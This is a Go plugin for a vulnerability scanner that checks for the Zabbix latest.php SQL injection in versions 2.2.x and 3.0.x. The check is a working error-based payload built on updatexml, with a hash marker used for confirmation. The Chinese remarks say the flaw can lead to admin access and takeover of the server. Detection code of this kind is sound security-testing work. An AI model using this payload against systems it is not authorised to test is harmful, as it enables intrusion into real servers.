package goplugin

import (
	"fmt"
	"net/http"
	"regexp"
	"strings"
	"vuldb/common"
	"vuldb/plugin"
)

type zabbixLatestSQL struct {
	info   common.PluginInfo
	result []common.PluginInfo
}

func init() {
	plugin.Regist("zabbix", &zabbixLatestSQL{})
}
func (d *zabbixLatestSQL) Init() common.PluginInfo{
	d.info = common.PluginInfo{
		Name:    "Zabbix latest.php SQL注入漏洞",
		Remarks: "影响版本：2.2.x/3.0.x，攻击者通过此漏洞可获取管理员权限登陆后台，由于后台存在执行命令功能，可导致服务器被入侵控制",
		Level:   1,
		Type:    "SQL",
		Author:   "wolf",
        References: common.References{
        	URL: "",
        	CVE: "",
        },
	}
	return d.info
}
func (d *zabbixLatestSQL) GetResult() []common.PluginInfo {
	return d.result
}
func (d *zabbixLatestSQL) Check(URL string, meta plugin.TaskMeta) bool {
	request, err := http.NewRequest("GET", URL+"/dashboard.php", nil)
	if err != nil {
		return false
	}
	resp, err := common.RequestDo(request, false)
	if err != nil {
		return false
	}
	r, _ := regexp.Compile(`href="slides\.php\?sid=(.+?)">`)
	sid := r.FindStringSubmatch(string(resp.Body))
	if len(sid) < 1 {
		return false
	}
	// fmt.Println(sid)
	poc := fmt.Sprintf("/latest.php?output=ajax&sid=%s&favobj=toggle&toggle_open_state=1&toggle_ids[]=(select 0updatexml(1,concat(0x7e,(SELECT md5(666)),0x7e),1))", sid[1])
	request, err = http.NewRequest("GET", URL+poc, nil)
	if err != nil {
		return false
	}
	resp, err = common.RequestDo(request, true)
	if err != nil {
		return false
	}
	if strings.Contains(resp.ResponseRaw, "fae0b27c451c728867a567e8c1bb4e5") {
		result := d.info
		result.Response = resp.ResponseRaw
		result.Request = resp.RequestRaw
		d.result = append(d.result, result)
		return true
	}
	return false
}
